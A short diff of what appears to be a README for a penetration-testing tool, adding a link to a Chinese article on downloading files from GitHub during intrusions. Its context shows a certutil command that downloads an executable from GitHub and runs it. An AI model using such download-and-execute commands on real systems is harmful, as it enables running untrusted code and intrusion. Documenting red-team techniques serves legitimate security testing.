@@ -19,6 +19,13 @@ eg.
 
 `var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&&c:\\a.exe';`
 
+Note:
+
+More ways to download & execution：
+
+[《渗透技巧——从github下载文件的多种方法》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/)
+
+
 3. Start the server
 
 ```
